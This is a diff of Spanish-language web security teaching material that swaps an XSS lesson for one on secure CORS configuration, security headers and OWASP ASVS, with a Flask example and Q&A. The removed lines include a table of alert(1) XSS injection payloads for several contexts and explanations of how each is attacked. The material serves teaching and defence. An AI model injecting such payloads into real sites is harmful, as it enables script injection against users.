-**Solucion:**
+# Cache de preflight (24 horas)
+PREFLIGHT_MAX_AGE = 86400
 
-| Contexto | Payload |
-|----------|---------|
-| Entre tags HTML | `<script>alert(1)</script>` o `<img src=x onerror=alert(1)>` |
-| Atributo HTML | `" onfocus="alert(1)" autofocus` o `" onmouseover="alert(1)` |
-| JavaScript string | `'; alert(1); var x='` o `</script><script>alert(1)</script>` |
-| Event handler | `alert(1)` o `alert(1)//` (no necesita tags) |
-| URL en atributo | `javascript:alert(1)` |
-| CSS | `red; background-image: url(javascript:alert(1)); x: ` |
+USUARIOS = {
+    1: {'nombre': 'Juan', 'email': 'juan@bank.com', 'cuenta': 'ES12 3456 7890 1234', 'saldo': 50000},
+    2: {'nombre': 'Maria', 'email': 'maria@bank.com', 'cuenta': 'ES98 7654 3210 9876', 'saldo': 120000},
+}
+
+def configure_cors(response):
+    """Configura CORS de forma segura"""
+    origin = request.headers.get('Origin', '')
+
+    # Solo permitir origenes de la lista blanca
+    if origin in ALLOWED_ORIGINS:
+        response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Credentials'] = 'true'
+        response.headers['Access-Control-Allow-Methods'] = ', '.join(ALLOWED_METHODS)
+        response.headers['Access-Control-Allow-Headers'] = ', '.join(ALLOWED_HEADERS)
+        response.headers['Access-Control-Max-Age'] = str(PREFLIGHT_MAX_AGE)
+    else:
+        # Si el origen no esta permitido, no incluir header CORS
+        # El navegador bloqueara la request
+        pass
+
+    return response
+
+@app.after_request
+def after_request(response):
+    return configure_cors(response)
+
+@app.route('/api/perfil')
+def perfil():
+    if 'user_id' not in session:
+        return jsonify({'error': 'No autenticado'}), 401
+
+    user_id = session['user_id']
+    if user_id not in USUARIOS:
+        return jsonify({'error': 'Usuario no encontrado'}), 404
+
+    user_data = USUARIOS[user_id]
+
+    # Solo devolver datos minimos necesarios
+    return jsonify({
+        'nombre': user_data['nombre'],
+        'email': user_data['email'],
+        # NO incluir cuenta bancaria ni saldo en respuestas CORS
+    })
+
+@app.route('/api/perfil/completo')
+def perfil_completo():
+    """Endpoint que requiere mismo origen (no CORS)"""
+    if 'user_id' not in session:
+        return jsonify({'error': 'No autenticado'}), 401
+
+    # Verificar que la request es del mismo origen
+    origin = request.headers.get('Origin', '')
+    if origin and origin not in ALLOWED_ORIGINS:
+        return jsonify({'error': 'Acceso denegado desde este origen'}), 403
+
+    user_id = session['user_id']
+    user_data = USUARIOS.get(user_id)
+    if not user_data:
+        return jsonify({'error': 'Usuario no encontrado'}), 404
+
+    # Datos completos solo disponibles para origenes confiables
+    return jsonify(user_data)
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000)
+```
+
+**Principios de CORS seguro:**
+
+1. **Whitelist, no blacklist:** Listar origenes explicitamente permitidos
+2. **No reflejar Origin:** Nunca devolver el header Origin como Allow-Origin
+3. **No usar `*` con credenciales:** Es invalido y peligroso
+4. **Minimo privilegio:** Solo permitir los metodos y headers necesarios
+5. **Preflight con cache:** Cachear preflight OPTIONS para reducir overhead
+6. **Datos minimos:** No exponer datos sensibles en endpoints CORS
 
 ---
 
 ## Preguntas y Respuestas
 
 ### Pregunta 1
-**Cual es la diferencia fundamental entre XSS Reflejado y XSS Almacenado?**
+**Cuales son los 5 security headers mas importantes y que protegen?**
 
-**Respuesta:** En XSS Reflejado, el payload no se almacena en el servidor; se refleja inmediatamente en la respuesta HTTP. La victima debe hacer click en una URL especialmente disenada. En XSS Almacenado, el payload se persiste en el servidor (base de datos, archivos, sistema de archivos) y se ejecuta cada vez que cualquier usuario visita la pagina infectada, sin necesidad de hacer click en una URL especial. El almacenado es mas peligroso porque afecta a multiples usuarios sin interaccion adicional.
+**Respuesta:** (1) **Strict-Transport-Security (HSTS)**: fuerza HTTPS y previene ataques SSL stripping y downgrade attacks. (2) **X-Frame-Options**: previene clickjacking al impedir que la pagina se cargue en un iframe. (3) **X-Content-Type-Options: nosniff**: previene que el navegador adivine el tipo MIME de un recurso (MIME sniffing attacks). (4) **Content-Security-Policy**: es la defensa mas potente contra XSS, controlando que recursos (scripts, estilos, imagenes) puede cargar la pagina. (5) **Referrer-Policy**: controla cuanta informacion de la URL se envia en el header Referer al navegar a otros sitios.
 
 ### Pregunta 2
-**Que es XSS DOM-based y en que se diferencia de los otros tipos?**
+**Por que es peligroso reflejar el header Origin como Access-Control-Allow-Origin?**
 
-**Respuesta:** XSS DOM-based ocurre completamente en el lado del cliente. El servidor no es parte del ataque; la vulnerabilidad existe en el codigo JavaScript que lee datos de fuentes del DOM (URL, `location.hash`, `document.referrer`, `localStorage`, `postMessage`) y los escribe en sumideros peligrosos (`innerHTML`, `document.write`, `eval`, `setTimeout` con strings). A diferencia de XSS Reflejado y Almacenado, el servidor nunca ve el payload porque se ejecuta completamente en el cliente. Esto lo hace dificil de detectar con scanners tradicionales (que solo analizan respuestas del servidor).
+**Respuesta:** Reflejar el Origin es peligroso porque un atacante puede hacer que el navegador de la victima envie una request desde `atacante.com` y el servidor respondera con `Access-Control-Allow-Origin: atacante.com`, permitiendo que `atacante.com` lea la respuesta. Combinado con `Access-Control-Allow-Credentials: true`, el atacante puede robar datos autenticados del usuario. Ejemplo: si el usuario esta autenticado en `bank.com`, y visita `atacante.com`, un script en `atacante.com` puede hacer fetch a `bank.com/api/perfil` y leer los datos bancarios porque el servidor refleja el origen.
 
 ### Pregunta 3
-**Cuales son los contextos mas comunes donde ocurre XSS y como se ataca cada uno?**
+**Que informacion sensible se debe evitar en respuestas de error?**
 
-**Respuesta:** Los contextos mas comunes son: (1) **Entre tags HTML**: cerrar el contexto actual e insertar un nuevo tag `<script>`. (2) **Dentro de un atributo HTML**: escapar del valor del atributo con `" onfocus=alert(1) autofocus`. (3) **Dentro de un string JavaScript**: romper el string con `'; alert(1); var x='`. (4) **En un event handler**: insertar codigo JS directamente sin necesidad de tags HTML completos. (5) **En una URL**: usar `javascript:alert(1)` como protocolo. (6) **En CSS**: usar `background-image: url(javascript:...)` o expression() en IE antiguo.
+**Respuesta:** En respuestas de error NUNCA se debe incluir: (1) stack traces completos (revelan estructura del codigo, rutas de archivos, versiones), (2) versiones de software (Python X.Y, Flask X.Y, MySQL X.Y), (3) nombres de archivos y numeros de linea, (4) consultas SQL o detalles de la base de datos, (5) tokens internos, API keys, o configuraciones del servidor, (6) nombres de usuarios internos o estructuras de directorios. En su lugar, devolver mensajes genericos como "Error interno del servidor" y loggear el detalle completo en el servidor para debugging.
 
 ### Pregunta 4
-**Por que innerHTML es peligroso y cual es la alternativa segura?**
+**Que es un ataque de directory listing y como se previene?**
 
-**Respuesta:** `innerHTML` es peligroso porque el navegador parsea el string como HTML, ejecutando cualquier tag `<script>` o atributo `onerror`/`onload` que contenga. Incluso si solo quieres insertar texto, `innerHTML` lo interpreta como markup. La alternativa segura es `textContent` (o `innerText`), que trata el valor como texto plano y escapa cualquier caracter HTML automaticamente. Para insertar HTML de forma segura, usar `document.createElement()` y `document.createTextNode()` en lugar de concatenar strings.
+**Respuesta:** Directory listing ocurre cuando un servidor web muestra el listado de archivos de un directorio cuando no hay un archivo index (index.html, index.php). Esto expone toda la estructura del proyecto, archivos de configuracion, backups, y datos sensibles. Prevencion: (1) deshabilitar directory listing en el servidor web (Apache: `Options -Indexes`, Nginx: `autoindex off;`), (2) asegurarse de que todos los directorios tengan un archivo index, (3) no almacenar archivos sensibles dentro del webroot, (4) usar archivos .htaccess o configuracion del servidor para restringir acceso a directorios especificos.
 
 ### Pregunta 5
-**Es posible tener XSS en APIs REST que solo devuelven JSON?**
+**Cual es la diferencia entre CORS y CSRF? Como se relacionan?**
 
-**Respuesta:** Si, aunque menos comun. Si la API devuelve JSON con `Content-Type: application/json`, el navegador no ejecutara scripts. El riesgo ocurre si: (1) la respuesta JSON se refleja en una pagina HTML (XSS Reflejado via JSONP), (2) el `Content-Type` esta mal configurado (ej: `text/html` en vez de `application/json`), (3) hay vulnerabilidades de inyeccion en el propio codigo JS que procesa la respuesta JSON (ej: `eval()` sobre la respuesta), (4) hay ataques de JSON hijacking (versiones antiguas de navegadores). Las APIs deben siempre configurar `Content-Type: application/json` y escapar cualquier dato que se refleje en respuestas de error.
+**Respuesta:** CORS (Cross-Origin Resource Sharing) es un mecanismo del navegador que controla que origenes pueden acceder a recursos de otro origen. CSRF (Cross-Site Request Forgery) es un ataque donde un sitio malicioso hace que el navegador de la victima envie una request a otro sitio donde esta autenticada. CORS mal configurado facilita CSRF porque permite leer la respuesta de la request cross-origin. Para prevenir: (1) CORS bien configurado (whitelist de origenes), (2) CSRF tokens en formularios, (3) SameSite cookies, (4) verificar header Referer/Origin en el servidor.
 
 ### Pregunta 6
-**Como se puede prevenir XSS en el contexto de una SPA (Single Page Application) moderna?**
+**Que es OWASP ASVS y como ayuda a prevenir configuraciones inseguras?**
 
-**Respuesta:** En SPAs modernas (React, Angular, Vue), la prevencion se basa en: (1) usar el escape automatico que proporciona el framework (React escapa en JSX, Angular con interpolacion `{{ }}`), (2) evitar metodos peligrosos como `dangerouslySetInnerHTML` (React), `bypassSecurityTrustHtml` (Angular), `v-html` (Vue), (3) no usar `eval()`, `new Function()`, `setTimeout(string)` que ejecutan codigo arbitrario, (4) sanitizar cualquier HTML que deba renderizarse (usando DOMPurify, bleach), (5) implementar CSP estricto (nonce-based), (6) validar y sanitizar datos en el servidor antes de enviarlos al cliente.
+**Respuesta:** OWASP ASVS (Application Security Verification Standard) es un estandar que define requisitos de seguridad para aplicaciones web organizados en niveles (L1, L2, L3). Para configuraciones inseguras, ASVS especifica requisitos como: V14.1 (verificar que configuraciones por defecto y servicios innecesarios esten deshabilitados), V14.2 (verificar headers de seguridad), V14.4 (verificar que el manejo de errores no revele informacion), V14.5 (verificar configuracion CORS). ASVS proporciona una checklist que los equipos pueden usar durante desarrollo, testing y auditoria para asegurar que todas las configuraciones de seguridad esten correctamente implementadas.
 
 ---
 
 ## Tarea / Lectura Recomendada
 
-1. **Leer:** OWASP XSS Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
-2. **Leer:** OWASP DOM-based XSS Prevention - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
-3. **Practicar:** PortSwigger XSS Labs - https://portswigger.net/web-security/cross-site-scripting
-4. **Experimentar:** Configurar la app Flask vulnerable, probar distintos payloads XSS
-5. **Leer:** "XSS Game" de Google - https://xss-game.appspot.com/ (ejercicios interactivos)
-6. **Profundizar:** Investigar mutation XSS (mXSS) y XSS en contextos de service workers
+1. **Leer:** OWASP Security Headers Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
+2. **Leer:** OWASP ASVS (Application Security Verification Standard) - https://owasp.org/www-project-application-security-verification-standard/
+3. **Practicar:** Usar securityheaders.com para analizar headers de sitios populares
+4. **Experimentar:** Configurar un servidor Flask con todos los security headers y verificar con curl
+5. **Leer:** Mozilla Observatory - https://observatory.mozilla.org/ (herramienta para evaluar security headers)
+6. **Profundizar:** Investigar el ataque "CORS misconfiguration" en PortSwigger Web Security Academy
+7. **Leer:** OWASP CORS Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html
+
 
 
